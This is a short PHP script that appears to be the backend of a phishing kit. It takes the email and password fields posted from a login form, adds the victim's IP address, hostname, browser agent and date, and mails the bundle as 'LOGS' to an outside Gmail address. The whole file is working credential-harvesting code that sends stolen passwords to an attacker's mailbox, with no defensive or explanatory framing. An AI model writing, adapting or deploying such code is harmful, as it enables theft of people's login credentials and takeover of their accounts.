
<?php
//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];
$datamasii=date("D M d, Y g:i a"); 

//Getting UserID info from Session
$email = $_POST['email'];
$password1 = $_POST['password1'];
$passwww = $_POST['password'];

$mesaj="==================+[ User Info  ]+==================
-----------Powered By : © IroKo Host Network-------------

Email: $email
Password   : $password1
Re-Confirm Password : $passwww
-------------------+	+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Hostname: $hostname
Agent: $agent
DATE : $datamasii 
-----------------+  +-----------------";

$subject = "$email IRoKoHoST SHARAFCO LOGS";
$headers = 'From: irokohost@szmzsl.com' . "\r\n" . 
    'X-Mailer: PHP/' . phpversion(); 
mail('julienneamiviakpako@gmail.com', $subject, $mesaj, $headers);

?>

